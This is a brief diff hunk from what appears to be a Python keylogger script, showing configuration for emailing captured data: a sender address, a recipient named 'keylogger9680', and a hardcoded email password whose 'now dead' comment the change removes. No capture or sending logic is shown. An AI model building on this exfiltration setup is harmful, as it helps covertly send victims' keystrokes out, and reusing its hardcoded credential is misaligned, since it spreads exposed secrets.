@@ -20,7 +20,7 @@ email_from = "rohan3112008@gmail.com"
 email_list = ["keylogger9680@gmail.com"]
 
 # Define the password (better to reference externally)
-pswd = "kyinglndyaivznpe" # As shown in the video this password is now dead, left in as example only
+pswd = "kyinglndyaivznpe" 
 
 
 # name the email subject
